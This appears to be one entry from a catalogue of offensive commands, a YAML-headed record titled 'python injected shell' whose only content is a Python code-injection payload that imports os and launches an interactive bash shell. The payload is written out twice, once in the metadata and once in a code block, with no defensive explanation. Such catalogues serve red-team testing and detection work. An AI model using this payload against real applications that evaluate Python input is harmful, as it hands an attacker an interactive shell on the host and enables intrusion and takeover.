---
id: 3e54911d-096d-46ff-94b2-0eb691019972
name: python injected shell
type: command
executor: bash
data: '__builtins__.__import__(''os'').system(''/bin/bash -i'')

  '
output: null
created_at: '2020-07-14T18:15:02.616038+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# python injected shell

```bash
__builtins__.__import__('os').system('/bin/bash -i')

```
